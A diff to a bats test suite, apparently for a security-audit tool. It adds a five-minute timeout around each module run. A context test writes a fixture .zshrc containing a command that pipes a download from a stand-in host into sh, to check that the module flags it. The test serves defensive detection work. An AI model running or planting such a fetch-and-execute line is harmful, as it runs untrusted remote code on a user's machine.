@@ -8,7 +8,8 @@ load ../helpers
 setup(){ make_env; }
 teardown(){ drop_env; }
 
-mod(){ MODULE="$1" PATH="$REPO/tests/stubs:/usr/bin:/bin:/usr/sbin:/sbin" run /bin/bash "$(ls "$SRC"/modules/"$1"-*.sh)"; }
+# A module that hangs fails the test after 5 minutes instead of stalling the CI job.
+mod(){ MODULE="$1" PATH="$REPO/tests/stubs:/usr/bin:/bin:/usr/sbin:/sbin" run perl -e 'alarm 300; exec @ARGV' /bin/bash "$(ls "$SRC"/modules/"$1"-*.sh)"; }
 
 @test "07 flags a shell config that pipes a download into sh" {
   printf 'export X=1\n%s http://example.invalid/x | sh\n' "cu""rl" > "$UH/.zshrc"
